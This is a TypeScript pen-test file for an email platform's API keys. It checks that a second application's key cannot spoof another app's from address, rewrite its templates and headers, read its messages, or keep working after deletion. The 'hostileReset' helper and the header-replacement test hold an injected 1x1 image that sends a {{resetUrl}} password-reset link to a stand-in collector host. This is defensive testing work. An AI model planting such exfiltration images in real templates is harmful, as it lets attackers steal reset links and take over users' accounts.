/**
 * Pen test K1 (#94): API Keys and their reach (H3, H11). Each power of the `/v1` API is tried with the second
 * Application's key against Wizzaroo's Templates, Headers, Messages and from address; the deleted key against every
 * `/v1` route; and what the platform keeps and records about a key. `docs/pen-test/findings/K1.md` gives the verdicts.
 */
import { createHash } from "node:crypto";
import { eq, inArray, sql } from "drizzle-orm";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { runCliCommand } from "../../access/cli.js";
import { apiKeys, emailParts, messages, templates } from "../../lib/schema.js";
import { recipientsPerKeyPerMinute } from "../../sending/send-limit.js";
import { penTestFixtureIds } from "../fixtures/fixture-plan.js";
import {
  field,
  invalidKeyRefusal,
  listRoutes,
  probeRequest,
  readJson,
  unknownId,
  type RegisteredRoute,
} from "./b1-routes.js";
import {
  hasContainerRuntime,
  startProbeWorld,
  warnIfSkipped,
  type ProbeWorld,
} from "./probe-world.js";

warnIfSkipped("src/pen-test/probes/k1.test.ts");

const resetSlug = "wizzaroo-reset-your-password";
const unconfiguredFrom = "Chief Executive <ceo@bank.pen-test.invalid>";
const collector = "https://collector.pen-test.invalid/c";
const probeToken = "k1-probe-not-a-real-token";

const keyLookupPattern = /^ek_[0-9a-f]{16}_[A-Za-z0-9_-]{32}$/u;

/** A key's lookup id and random part; the random part is base64url, so it may hold `_` itself. */
const splitKey = (key: string): string[] =>
  /^ek_([0-9a-f]{16})_(.+)$/u.exec(key)?.slice(0, 3) ?? [];

const readLastUsedAt = async (world: ProbeWorld, id: string) => {
  const [row] = await world.database
    .select({ lastUsedAt: apiKeys.lastUsedAt })
    .from(apiKeys)
    .where(eq(apiKeys.id, id));
  return row?.lastUsedAt ?? null;
};

const readColumns = async (world: ProbeWorld, table: string) => {
  const result = await world.database.execute(
    sql`select column_name from information_schema.columns where table_schema = 'public' and table_name = ${table} order by ordinal_position`,
  );
  return result.rows.map((row) => String(row.column_name));
};

describe.skipIf(!hasContainerRuntime)(
  "pen test K1 (#94): API Keys and their reach",
  () => {
    let world: ProbeWorld;
    let v1Routes: RegisteredRoute[];

    beforeAll(async () => {
      world = await startProbeWorld();
      await world.server.ready();
      v1Routes = listRoutes(world.server).filter((route) =>
        route.path.startsWith("/v1/"),
      );
    }, 300_000);

    afterAll(async () => {
      await world.stop();
    });
    // Each probe starts with its keys' whole minute; the send-rate probe below counts within one.
    beforeEach(async () => world.forgetSendWindows());

    const wizzarooFrom = () => {
      const configuration = world.plan.configurations.find(
        (item) => item.id === penTestFixtureIds.configurations.wizzaroo,
      );
      if (configuration === undefined) {
        throw new Error("The plan has no Wizzaroo Configuration");
      }
      return `${configuration.fromName} <${configuration.fromEmail}>`;
    };

    const resetTemplate = () => {
      const template = world.plan.templates.find(
        (item) => item.slug === resetSlug,
      );
      if (template === undefined) {
        throw new Error(`The plan has no ${resetSlug}`);
      }
      return template;
    };

    const wizzarooResetMessage = () => {
      const message = world.plan.messages.find(
        (item) =>
          item.application === "wizzaroo" && item.templateSlug === resetSlug,
      );
      if (message === undefined) {
        throw new Error("The plan has no Wizzaroo reset Message");
      }
      return message;
    };

    const sendAs = (
      key: "wizzaroo" | "secondApp",
      payload: Record<string, unknown>,
    ) =>
      world.request({ key }, { method: "POST", url: "/v1/messages", payload });

    /* ---------- Sending from any from address ---------- */

    const sendAsWizzaroo = (subject: string) =>
      sendAs("secondApp", {
        from: wizzarooFrom(),
        to: ["parent99@families.pen-test.invalid"],
        subject,
        text: "Sent with the second app's key",
      });

    /** The Messages stored with this subject: a refused send stores none. */
    const messagesWithSubject = async (subject: string) =>
      world.database
        .select({ id: messages.id })
        .from(messages)
        .where(eq(messages.subject, subject));

    it("the second app's key cannot send from Wizzaroo's no-reply address", async () => {
      const response = await sendAsWizzaroo("K1 from Wizzaroo (property)");
      expect([403, 422]).toContain(response.statusCode);
    });

    it("(regression) the second app's key is refused Wizzaroo's no-reply address, given or through Wizzaroo's Template, and no mail arrives from it", async () => {
      await world.clearMail();
      const subject = "K1 from Wizzaroo (regression)";
      const response = await sendAsWizzaroo(subject);
      expect(response.statusCode).toBe(422);
      expect(field(readJson(response), "error")).toBe("validation_failed");
      expect(response.body).toContain("from");
      expect(await messagesWithSubject(subject)).toEqual([]);

      // Left out, the from comes from Wizzaroo's Template's Configuration, and that is refused too.
      const throughTemplate = await sendAs("secondApp", {
        to: ["parent99@families.pen-test.invalid"],
        templateSlug: resetSlug,
        variables: resetTemplate().sampleVariables,
      });
      expect(throughTemplate.statusCode).toBe(422);
      expect(await world.listMail()).toEqual([]);

      // Wizzaroo's own key still sends from it.
      const own = await sendAs("wizzaroo", {
        from: wizzarooFrom(),
        to: ["parent99@families.pen-test.invalid"],
        subject,
        text: "Sent with Wizzaroo's own key",
      });
      expect(own.statusCode).toBe(202);
    });

    it("a key cannot send from an address no Configuration or Setting names", async () => {
      const response = await sendAs("secondApp", {
        from: unconfiguredFrom,
        to: ["customer99@customers.pen-test.invalid"],
        subject: "K1 unconfigured from (property)",
        text: "Sent from an address no one configured",
      });
      expect([403, 422]).toContain(response.statusCode);
    });

    it("(regression) a key is refused an address no one configured, and no mail arrives from it; its own Configuration and the default still send", async () => {
      await world.clearMail();
      const subject = "K1 unconfigured from (regression)";
      const response = await sendAs("secondApp", {
        from: unconfiguredFrom,
        to: ["customer99@customers.pen-test.invalid"],
        subject,
        text: "Sent from an address no one configured",
      });
      expect(response.statusCode).toBe(422);
      expect(await messagesWithSubject(subject)).toEqual([]);
      expect(await world.listMail()).toEqual([]);

      const own = await sendAs("secondApp", {
        from: "Second app <Orders@second-app.pen-test.invalid>",
        to: ["customer99@customers.pen-test.invalid"],
        subject,
        text: "From the second app's own Configuration",
      });
      expect(own.statusCode).toBe(202);
      const byDefault = await sendAs("secondApp", {
        to: ["customer99@customers.pen-test.invalid"],
        subject,
        text: "From the default from address",
      });
      expect(byDefault.statusCode).toBe(202);
      expect(field(readJson(byDefault), "from")).toBe(
        world.plan.settings.defaultFrom,
      );
    });

    /* ---------- Rewriting Wizzaroo's reset Template ---------- */

    /** Wizzaroo's reset Template, with an image that sends its reset link to a server of the key holder's choosing. */
    const hostileReset = () => {
      const template = resetTemplate();
      return {
        name: template.name,
        slug: template.slug,
        subject: template.subject,
        html: template.html.replace(
          "</body>",
          `<img src="${collector}?l={{resetUrl}}" width="1" height="1" alt=""></body>`,
        ),
        text: template.text,
        variables: template.variables,
        sampleVariables: template.sampleVariables,
        headerId: template.headerId,
        footerId: template.footerId,
        configurationId: template.configurationId,
        design: null,
      };
    };

    it("the second app's key cannot replace Wizzaroo's reset Template", async () => {
      try {
        const response = await world.request(
          { key: "secondApp" },
          {
            method: "PUT",
            url: `/v1/templates/${resetTemplate().id}`,
            payload: hostileReset(),
          },
        );
        expect([403, 404]).toContain(response.statusCode);
      } finally {
        await world.reloadFixtures();
      }
    });

    it("(regression) the second app's key cannot rewrite Wizzaroo's reset Template, so Wizzaroo's next reset link reaches no other server", async () => {
      try {
        const replaced = await world.request(
          { key: "secondApp" },
          {
            method: "PUT",
            url: `/v1/templates/${resetTemplate().id}`,
            payload: hostileReset(),
          },
        );
        // Refused exactly as an unknown id is, so the refusal doesn't say the Template exists.
        const unknown = await world.request(
          { key: "secondApp" },
          {
            method: "PUT",
            url: `/v1/templates/${unknownId}`,
            payload: { ...hostileReset(), slug: "k1-unknown" },
          },
        );
        expect(replaced.statusCode).toBe(404);
        expect(replaced.body).toBe(unknown.body);
        const deleted = await world.request(
          { key: "secondApp" },
          { method: "DELETE", url: `/v1/templates/${resetTemplate().id}` },
        );
        expect(deleted.statusCode).toBe(404);
        const [stored] = await world.database
          .select({ html: templates.html })
          .from(templates)
          .where(eq(templates.id, resetTemplate().id));
        expect(stored?.html).toBe(resetTemplate().html);

        await world.clearMail();
        const resetUrl = `https://wizzaroo.pen-test.invalid/reset?token=${probeToken}`;
        const sent = await sendAs("wizzaroo", {
          to: ["parent98@families.pen-test.invalid"],
          templateSlug: resetSlug,
          variables: {
            ...resetTemplate().sampleVariables,
            email: "parent98@families.pen-test.invalid",
            resetUrl,
          },
        });
        expect(sent.statusCode).toBe(202);
        const id = String(field(readJson(sent), "id"));
        const [row] = await world.database
          .select({ html: messages.html })
          .from(messages)
          .where(eq(messages.id, id));
        // Handlebars escapes the link's `=` as `&#x3D;`.
        expect(row?.html).toContain(
          `https://wizzaroo.pen-test.invalid/reset?token&#x3D;${probeToken}`,
        );
        expect(row?.html).not.toContain(collector);
        expect(await world.deliver(id)).toBe("sent");
        const mail = (await world.listMail()).find((item) =>
          item.To.some(
            (address) =>
              address.Address === "parent98@families.pen-test.invalid",
          ),
        );
        expect(mail).toBeDefined();
        const raw = await world.readRawMail(mail?.ID ?? "");
        expect(raw).not.toContain("collector.pen-test.invalid");
      } finally {
        await world.reloadFixtures();
      }
    });

    /* ---------- Deleting the Header Wizzaroo's Templates use ---------- */

    it("the second app's key cannot delete the Header Wizzaroo's Templates use", async () => {
      try {
        const response = await world.request(
          { key: "secondApp" },
          {
            method: "DELETE",
            url: `/v1/headers/${penTestFixtureIds.parts.header}`,
          },
        );
        expect([403, 404, 409]).toContain(response.statusCode);
      } finally {
        await world.reloadFixtures();
      }
    });

    it("(regression) the second app's key cannot delete or replace the Header or Footer, and every Wizzaroo Template keeps them", async () => {
      try {
        const before = await world.database
          .select({ id: templates.id })
          .from(templates)
          .where(eq(templates.headerId, penTestFixtureIds.parts.header));
        expect(before).toHaveLength(15);
        const response = await world.request(
          { key: "secondApp" },
          {
            method: "DELETE",
            url: `/v1/headers/${penTestFixtureIds.parts.header}`,
          },
        );
        const unknown = await world.request(
          { key: "secondApp" },
          { method: "DELETE", url: `/v1/headers/${unknownId}` },
        );
        expect(response.statusCode).toBe(404);
        expect(response.body).toBe(unknown.body);
        for (const [kind, id] of [
          ["headers", penTestFixtureIds.parts.header],
          ["footers", penTestFixtureIds.parts.footer],
        ] as const) {
          const replaced = await world.request(
            { key: "secondApp" },
            {
              method: "PUT",
              url: `/v1/${kind}/${id}`,
              payload: {
                name: "K1 replaced",
                html: `<img src="${collector}">`,
              },
            },
          );
          expect(replaced.statusCode).toBe(404);
          const deleted = await world.request(
            { key: "secondApp" },
            { method: "DELETE", url: `/v1/${kind}/${id}` },
          );
          expect(deleted.statusCode).toBe(404);
        }
        const after = await world.database
          .select({ id: templates.id })
          .from(templates)
          .where(eq(templates.headerId, penTestFixtureIds.parts.header));
        expect(after).toHaveLength(15);
        const reset = await world.request(
          { key: "wizzaroo" },
          { method: "GET", url: `/v1/templates/${resetTemplate().id}` },
        );
        expect(field(readJson(reset), "headerId")).toBe(
          penTestFixtureIds.parts.header,
        );
      } finally {
        await world.reloadFixtures();
      }
    });

    /* ---------- Reading a Wizzaroo Message ---------- */

    it("the second app's key cannot read a Message Wizzaroo sent", async () => {
      const response = await world.request(
        { key: "secondApp" },
        { method: "GET", url: `/v1/messages/${wizzarooResetMessage().id}` },
      );
      expect(response.statusCode).toBe(404);
    });

    it("(regression) the second app's key gets 404 for a Wizzaroo Message, exactly as for an unknown id, and still reads its own", async () => {
      const message = wizzarooResetMessage();
      const response = await world.request(
        { key: "secondApp" },
        { method: "GET", url: `/v1/messages/${message.id}` },
      );
      const unknown = await world.request(
        { key: "secondApp" },
        { method: "GET", url: `/v1/messages/${unknownId}` },
      );
      expect(response.statusCode).toBe(404);
      expect(response.body).toBe(unknown.body);
      expect(response.body).not.toContain(message.to[0] ?? "missing");

      const own = world.plan.messages.find(
        (item) => item.application === "second-app",
      );
      const ownRead = await world.request(
        { key: "secondApp" },
        { method: "GET", url: `/v1/messages/${own?.id ?? unknownId}` },
      );
      expect(ownRead.statusCode).toBe(200);
      const wizzarooRead = await world.request(
        { key: "wizzaroo" },
        { method: "GET", url: `/v1/messages/${message.id}` },
      );
      expect(field(readJson(wizzarooRead), "to")).toEqual(message.to);
    });

    /* ---------- The deleted key ---------- */

    it("refuses the deleted fixture key on every /v1 route with one 401 body", async () => {
      expect(v1Routes.length).toBeGreaterThanOrEqual(20);
      for (const route of v1Routes) {
        const response = await world.server.inject(
          probeRequest(
            route,
            world.asKey("deleted"),
            wizzarooResetMessage().id,
          ),
        );
        expect({ route, status: response.statusCode }).toEqual({
          route,
          status: 401,
        });
        if (route.method !== "HEAD") {
          expect(readJson(response)).toEqual(invalidKeyRefusal);
        }
      }
    });

    it("refuses a key on every /v1 route straight after a User deletes it", async () => {
      const victim = await world.asUser("victim");
      const created = await world.server.inject({
        method: "POST",
        url: "/app/api-keys",
        headers: victim,
        payload: {
          name: "K1 deleted straight away",
          currentPassword: world.credentials.passwords.victim,
        },
      });
      expect(created.statusCode).toBe(201);
      const secret = String(field(readJson(created), "secret"));
      const id = String(field(field(readJson(created), "apiKey"), "id"));
      const bearer = { authorization: `Bearer ${secret}` };
      const before = await world.server.inject({
        method: "GET",
        url: "/v1/templates",
        headers: bearer,
      });
      expect(before.statusCode).toBe(200);
      const deleted = await world.server.inject({
        method: "DELETE",
        url: `/app/api-keys/${id}`,
        headers: victim,
      });
      expect(deleted.statusCode).toBe(200);
      for (const route of v1Routes) {
        const response = await world.server.inject(
          probeRequest(route, bearer, wizzarooResetMessage().id),
        );
        expect({ route, status: response.statusCode }).toEqual({
          route,
          status: 401,
        });
      }
    });

    /* ---------- Entropy, storage, comparison and display ---------- */

    it("a new key has a 64-bit lookup id and a 192-bit secret, is stored only as its SHA-256, and is shown once", async () => {
      const victim = await world.asUser("victim");
      const created = await world.server.inject({
        method: "POST",
        url: "/app/api-keys",
        headers: victim,
        payload: {
          name: "K1 entropy",
          currentPassword: world.credentials.passwords.victim,
        },
      });
      expect(created.statusCode).toBe(201);
      const secret = String(field(readJson(created), "secret"));
      const id = String(field(field(readJson(created), "apiKey"), "id"));
      expect(secret).toMatch(keyLookupPattern);
      const [, lookupId = "", random = ""] = splitKey(secret);
      expect(Buffer.from(lookupId, "hex")).toHaveLength(8);
      expect(Buffer.from(random, "base64url")).toHaveLength(24);

      const [row] = await world.database
        .select()
        .from(apiKeys)
        .where(eq(apiKeys.id, id));
      expect(row?.secretHash).toBe(
        createHash("sha256").update(secret).digest("hex"),
      );
      expect(JSON.stringify(row)).not.toContain(random);

      const listed = await world.server.inject({
        method: "GET",
        url: "/app/api-keys",
        headers: victim,
      });
      expect(listed.body).not.toContain(random);
      expect(listed.body).not.toContain(row?.secretHash ?? "missing");
      const summary = [field(readJson(listed), "apiKeys")]
        .flat(2)
        .find((item) => field(item, "id") === id);
      expect(
        Object.keys(
          typeof summary === "object" && summary !== null ? summary : {},
        ),
      ).toEqual([
        "id",
        "name",
        "prefix",
        "applicationId",
        "applicationName",
        "lastUsedAt",
        "createdAt",
        // Who minted it (pen test A2, #125).
        "createdByUserId",
        "createdByEmail",
      ]);
      expect(field(summary, "prefix")).toBe(`ek_${lookupId}_…`);
      expect(field(summary, "lastUsedAt")).toBeNull();
    });

    it("the CLI prints a new key once, and the list shows only its prefix", async () => {
      const output = await runCliCommand(
        world.database,
        ["apikey:create", "K1 cli"],
        () => Promise.resolve(""),
      );
      const secret = output.split("\n").at(-1) ?? "";
      expect(output).toMatch(
        /^Created API key "K1 cli"\. Store it now; it is not shown again:\n/u,
      );
      expect(secret).toMatch(keyLookupPattern);
      const listed = await world.request(
        { user: "colleague" },
        { method: "GET", url: "/app/api-keys" },
      );
      expect(listed.body).not.toContain(splitKey(secret)[2] ?? "missing");
      expect(listed.body).toContain(`ek_${splitKey(secret)[1] ?? "missing"}_…`);
    });

    it("refuses a real lookup id with a wrong secret exactly as it refuses an unknown key", async () => {
      const real = world.credentials.apiKeys.wizzaroo;
      const [, lookupId = ""] = splitKey(real);
      const wrongSecret = `ek_${lookupId}_${"A".repeat(32)}`;
      const unknownLookup = `ek_${"0".repeat(16)}_${"A".repeat(32)}`;
      const answers = await Promise.all(
        [wrongSecret, unknownLookup, `${real}x`, real.toUpperCase()].map(
          (token) =>
            world.server.inject({
              method: "GET",
              url: "/v1/templates",
              headers: { authorization: `Bearer ${token}` },
            }),
        ),
      );
      for (const answer of answers) {
        expect(answer.statusCode).toBe(401);
        expect(readJson(answer)).toEqual(invalidKeyRefusal);
        expect(answer.body.length).toBe(
          JSON.stringify(invalidKeyRefusal).length,
        );
      }
    });

    /* ---------- What is recorded about which key did what ---------- */

    it("each Message, Template, Header and Footer records the API Key that sent or last changed it", async () => {
      const [messageColumns, templateColumns, partColumns] = await Promise.all([
        readColumns(world, "messages"),
        readColumns(world, "templates"),
        readColumns(world, "email_parts"),
      ]);
      expect(messageColumns).toContain("api_key_id");
      expect(templateColumns).toContain("updated_by_api_key_id");
      expect(partColumns).toContain("updated_by_api_key_id");
    });

    it("(regression) a Message records the key that sent it, and a Template, Header or Footer the key or User that last changed it (#132)", async () => {
      expect(await readColumns(world, "messages")).toEqual([
        "id",
        "created_at",
        "template_id",
        "from",
        "to",
        "cc",
        "bcc",
        "reply_to",
        "subject",
        "html",
        "text",
        "status",
        "provider_message_id",
        "error",
        "attempts",
        "sent_at",
        "idempotency_key",
        "application_id",
        "api_key_id",
        // The fingerprint of the request, so a repeated Idempotency-Key with another body is refused (S2, #135).
        "request_fingerprint",
      ]);
      for (const table of ["templates", "email_parts"]) {
        const columns = await readColumns(world, table);
        expect(columns.filter((column) => /key|by|user/u.test(column))).toEqual(
          ["updated_by_api_key_id", "updated_by_user_id"],
        );
      }
      // The key that makes a Template or Header is recorded on it; a User's change then replaces the key with the User.
      const madeTemplate = await world.request(
        { key: "wizzaroo" },
        {
          method: "POST",
          url: "/v1/templates",
          payload: {
            name: "K1 who changed this",
            slug: "k1-who-changed-this",
            subject: "Who?",
            html: "<p>Which key?</p>",
          },
        },
      );
      const madeHeader = await world.request(
        { key: "wizzaroo" },
        {
          method: "POST",
          url: "/v1/headers",
          payload: { name: "K1 who changed this", html: "<p>Which key?</p>" },
        },
      );
      expect([madeTemplate.statusCode, madeHeader.statusCode]).toEqual([
        201, 201,
      ]);
      const templateId = String(field(readJson(madeTemplate), "id"));
      const headerId = String(field(readJson(madeHeader), "id"));
      try {
        const byWizzaroo = {
          updatedByApiKeyId: penTestFixtureIds.apiKeys.wizzaroo,
          updatedByUserId: null,
        };
        expect(readJson(madeTemplate)).toMatchObject(byWizzaroo);
        expect(readJson(madeHeader)).toMatchObject(byWizzaroo);
        const changed = await world.request(
          { user: "victim" },
          {
            method: "PUT",
            url: `/app/headers/${headerId}`,
            payload: { name: "K1 who changed this", html: "<p>A User</p>" },
          },
        );
        expect(changed.statusCode).toBe(200);
        const [header] = await world.database
          .select({
            updatedByApiKeyId: emailParts.updatedByApiKeyId,
            updatedByUserId: emailParts.updatedByUserId,
          })
          .from(emailParts)
          .where(eq(emailParts.id, headerId));
        expect(header).toEqual({
          updatedByApiKeyId: null,
          updatedByUserId: penTestFixtureIds.users.victim,
        });
      } finally {
        await world.database
          .delete(templates)
          .where(eq(templates.id, templateId));
        await world.database
          .delete(emailParts)
          .where(eq(emailParts.id, headerId));
      }
      const tables = await world.database.execute(
        sql`select table_name from information_schema.tables where table_schema = 'public' order by table_name`,
      );
      expect(tables.rows.map((row) => String(row.table_name))).toEqual([
        "api_keys",
        "applications",
        "configurations",
        "email_parts",
        "message_attachments",
        "messages",
        "sessions",
        "settings",
        "templates",
        "throttle_keys",
        "users",
      ]);
      // The same send from either key gives /v1 summaries that differ only in their id and time; the rows name the key.
      const payload = {
        to: ["customer97@customers.pen-test.invalid"],
        subject: "K1 who sent this",
        text: "Which key?",
      };
      const [fromWizzaroo, fromSecondApp] = await Promise.all([
        sendAs("wizzaroo", payload),
        sendAs("secondApp", payload),
      ]);
      const strip = (body: unknown) =>
        Object.fromEntries(
          Object.entries(
            typeof body === "object" && body !== null ? body : {},
          ).filter(([key]) => !["id", "createdAt"].includes(key)),
        );
      expect(strip(readJson(fromWizzaroo))).toEqual(
        strip(readJson(fromSecondApp)),
      );
      const senders = await world.database
        .select({ apiKeyId: messages.apiKeyId })
        .from(messages)
        .where(
          inArray(messages.id, [
            String(field(readJson(fromWizzaroo), "id")),
            String(field(readJson(fromSecondApp), "id")),
          ]),
        );
      expect(new Set(senders.map((row) => row.apiKeyId))).toEqual(
        new Set([
          penTestFixtureIds.apiKeys.wizzaroo,
          penTestFixtureIds.apiKeys.secondApp,
        ]),
      );
    });

    /* ---------- Send rate and last_used_at ---------- */

    it("a key's sends are counted against a limit the response reports", async () => {
      const response = await sendAs("secondApp", {
        to: ["customer96@customers.pen-test.invalid"],
        subject: "K1 rate (property)",
        text: "Counted?",
      });
      expect(
        response.headers["ratelimit-limit"] ??
          response.headers["x-ratelimit-limit"],
      ).toBeDefined();
    });

    /** `count` distinct recipient addresses, as many in to as it holds and the rest in cc, then bcc. */
    const recipientsFields = (count: number, label: string) => {
      const addresses = Array.from(
        { length: count },
        (_, index) => `${label}-${String(index)}@customers.pen-test.invalid`,
      );
      return {
        to: addresses.slice(0, 50),
        cc: addresses.slice(50, 100),
        bcc: addresses.slice(100),
      };
    };

    it("(regression) one key's sends are counted in recipient addresses against its limit a minute, reported in RateLimit headers; past it a 429 with Retry-After stores nothing; last_used_at is written at most once a minute (#133)", async () => {
      const id = penTestFixtureIds.apiKeys.secondApp;
      const limit = recipientsPerKeyPerMinute;
      const subject = (index: number) => `K1 rate ${String(index)}`;
      const sendOne = (index: number) =>
        sendAs("secondApp", {
          to: ["customer95@customers.pen-test.invalid"],
          subject: subject(index),
          text: "One of twenty",
        });

      // More recipients than a minute allows can never be sent, so that is a 422, not a 429, and counts nothing.
      const tooMany = await sendAs("secondApp", {
        ...recipientsFields(limit + 1, "k1-too-many"),
        subject: "K1 rate too many",
        text: "Never",
      });
      expect(tooMany.statusCode).toBe(422);

      const remaining: string[] = [];
      for (let index = 0; index < 20; index += 1) {
        const response = await sendOne(index);
        expect(response.statusCode).toBe(202);
        expect(response.headers["ratelimit-limit"]).toBe(String(limit));
        remaining.push(String(response.headers["ratelimit-remaining"]));
      }
      expect(remaining).toEqual(
        Array.from({ length: 20 }, (_, index) => String(limit - 1 - index)),
      );
      const rest = await sendAs("secondApp", {
        ...recipientsFields(limit - 20, "k1-rest"),
        subject: subject(20),
        text: "The rest of the minute",
      });
      expect(rest.statusCode).toBe(202);
      expect(rest.headers["ratelimit-remaining"]).toBe("0");

      const refused = await sendOne(21);
      expect(refused.statusCode).toBe(429);
      expect(refused.json()).toEqual({
        error: "too_many_requests",
        message:
          "Too many requests. Try again after the number of seconds in the Retry-After header",
      });
      const retryAfter = Number(refused.headers["retry-after"]);
      expect(retryAfter).toBeGreaterThanOrEqual(1);
      expect(retryAfter).toBeLessThanOrEqual(60);
      expect(refused.headers["ratelimit-remaining"]).toBe("0");
      expect(await messagesWithSubject(subject(21))).toEqual([]);

      // The limit is the key's own: another key still sends.
      const other = await sendAs("wizzaroo", {
        to: ["parent95@families.pen-test.invalid"],
        subject: "K1 rate, another key",
        text: "Wizzaroo's own minute",
      });
      expect(other.statusCode).toBe(202);

      // Once the key's minute is over, it sends again with its whole limit. The database's clock counts the minute.
      await world.database
        .update(apiKeys)
        .set({ sendWindowStartedAt: sql`now() - interval '61 seconds'` })
        .where(eq(apiKeys.id, id));
      const after = await sendOne(22);
      expect(after.statusCode).toBe(202);
      expect(after.headers["ratelimit-remaining"]).toBe(String(limit - 1));

      // last_used_at was written by the first call, and isn't again within the minute, a read or a send.
      const written = (await readLastUsedAt(world, id))?.getTime();
      expect(written).toBeDefined();
      const ownMessage = world.plan.messages.find(
        (item) => item.application === "second-app",
      );
      for (const url of [
        "/v1/templates",
        `/v1/messages/${ownMessage?.id ?? unknownId}`,
      ]) {
        const response = await world.request(
          { key: "secondApp" },
          { method: "GET", url },
        );
        expect(response.statusCode).toBe(200);
        expect((await readLastUsedAt(world, id))?.getTime()).toBe(written);
      }
      // A minute later the next call writes it again; a refused key writes nothing.
      await world.database
        .update(apiKeys)
        .set({ lastUsedAt: sql`now() - interval '2 minutes'` })
        .where(eq(apiKeys.id, id));
      const minuteAgo = (await readLastUsedAt(world, id)) ?? new Date(0);
      await world.request(
        { key: "secondApp" },
        { method: "GET", url: "/v1/templates" },
      );
      const rewritten = (await readLastUsedAt(world, id))?.getTime() ?? 0;
      expect(rewritten).toBeGreaterThan(minuteAgo.getTime());
      const badKey = await world.server.inject({
        method: "GET",
        url: "/v1/templates",
        headers: { authorization: "Bearer ek_7e57000000000002_wrong" },
      });
      expect(badKey.statusCode).toBe(401);
      expect((await readLastUsedAt(world, id))?.getTime()).toBe(rewritten);
    }, 60_000);
  },
);
